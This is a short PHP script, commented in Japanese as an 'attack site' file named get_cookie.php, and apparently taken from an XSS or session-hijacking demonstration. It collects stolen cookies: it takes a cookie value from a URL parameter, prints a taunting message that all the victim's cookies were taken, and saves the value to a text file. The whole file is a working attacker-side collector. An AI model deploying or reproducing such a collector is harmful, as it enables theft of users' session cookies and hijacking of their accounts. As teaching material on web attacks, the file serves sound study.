<?php
// get_cookie.php（攻撃サイト）

$cookie = $_GET["cookie"];

echo "あんたのCookie全部もらったよ</br>";
var_dump($cookie);

// Cookie情報をファイルに保存
file_put_contents('cookie.txt', $cookie);
?>
